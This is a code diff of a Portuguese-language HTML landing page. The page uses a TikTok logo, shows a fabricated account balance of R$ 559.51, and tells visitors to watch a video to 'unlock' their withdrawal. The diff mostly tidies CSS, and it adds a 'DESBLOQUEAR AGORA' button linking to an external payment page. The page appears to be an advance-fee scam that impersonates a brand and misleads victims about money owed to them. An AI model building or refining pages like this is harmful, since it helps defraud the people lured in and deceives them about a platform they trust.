@@ -15,43 +15,42 @@
             font-family: sans-serif;
             align-items: center;
             justify-content: flex-start;
-            padding-top: 10px; /* Compensa o header fixo */
+            padding-top: 10px;
         }
 
         .header {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    background-color: #ff0150;
-    color: white;
-    font-weight: bold;
-    text-align: center;
-    padding: 12px;
-    font-size: 12px;
-    z-index: 1000;
-}
-        #p1 {
-    max-width: 400px;
-    width: 90%;
-    background-color: #FFFFFF;
-    padding: 20px;
-    /* border-bottom: 0px solid #202020; */
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    margin: 20px;
-    /* box-shadow: 0 0px 0px rgba(0, 0, 0, 0.1); */
-}
-        #produto1 {
-        width: 100%;
-        max-width: 400px;
-        text-align: center;
-        padding: 0px;
-        color: #ff0150;
-        font-size: 16px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #ff0150;
+            color: white;
+            font-weight: bold;
+            text-align: center;
+            padding: 12px;
+            font-size: 12px;
+            z-index: 1000;
+        }
 
-    }
+        #p1 {
+            max-width: 400px;
+            width: 90%;
+            background-color: #FFFFFF;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 20px;
+        }
+
+        #produto1 {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            padding: 0px;
+            color: #ff0150;
+            font-size: 16px;
+        }
 
         #logo {
             width: 100px;
@@ -76,14 +75,14 @@
         }
 
         .valorSaldo {
-            font-size: 164x;
+            font-size: 16px;
             font-weight: 700;
             color: #333;
         }
 
         .phone-container {
             width: 340px;
-            height: 620px; /* Aspect ratio similar a 9:16 */
+            height: 620px;
             border: 3px solid #f30000a9;
             border-radius: 36px;
             box-shadow: 0 0 20px rgb(114, 24, 102);
@@ -128,29 +127,46 @@
         @keyframes pulse {
             0% {
                 transform: translateX(-50%) scale(0.85);
-                box-shadow: 0 0 0 0 #a33060;
             }
             50% {
                 transform: translateX(-50%) scale(1);
-                box-shadow: 0 0 0 10px rgba(0, 0, 0, 0);
             }
             100% {
                 transform: translateX(-50%) scale(0.95);
-                box-shadow: 0 0 0 0 rgba(0, 0, 0, 0);
             }
         }
 
-        @keyframes fadeInUp {
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        /* Botão */
+        .centralizar {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-top: 4px;
         }
 
+        button {
+            background-color: #ff0150;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            width: 85%;
+            max-width: 300px;
+            height: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
 
-        .video-thumbnail.hidden {
-            opacity: 0;
-            visibility: hidden;
+        button:hover {
+            background-color: #e66a00;
+        }
+
+        /* Responsividade */
+        @media (max-width: 480px) {
+            #p1 {
+                flex-direction: row;
+                justify-content: space-between;
+            }
         }
     </style>
 </head>
@@ -158,19 +174,20 @@
     <div class="header">
         ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO.
     </div>
-    
+
     <div id="p1">
-        
         <img id="logo" src="images/tiktoklogo.svg" alt="TikTok Logo">
         <div class="boxSaldo">
             <span class="textoSaldo">SALDO</span>
             <span class="valorSaldo">R$ <span class="saldoAtualizado">559.51</span></span>
         </div>
     </div>
+
     <div id="produto1">
         <h4 style="font-size: 22px; margin-top: 2px;">DESBLOQUEIO DE SALDO</h4>
         <h1 style="color: #000000be; font-size: 15px; margin-bottom: 4%;">Veja como liberar seu saque assistindo ao vídeo.</h1> 
     </div>   
+
     <div class="phone-container">
         <div class="video-container" onclick="unmuteVideo()">
             <video id="myVideo" autoplay muted>
@@ -178,6 +195,12 @@
             </video>
             <div id="videoThumbnail" class="video-thumbnail"></div>
         </div>
+    </div>
+
+    <div class="centralizar">
+        <a href="https://go.tribopay.com.br/xnvl0" style="text-decoration: none; width: 100%; display: flex; justify-content: center;">
+            <button>DESBLOQUEAR AGORA</button>
+        </a>
     </div>
 
     <script>
@@ -188,7 +211,7 @@
                 video.muted = false;
                 video.currentTime = 0;
                 video.play();
-                thumbnail.classList.add('hidden'); // Oculta a thumbnail com animação
+                thumbnail.classList.add('hidden');
             }
         }
     </script>
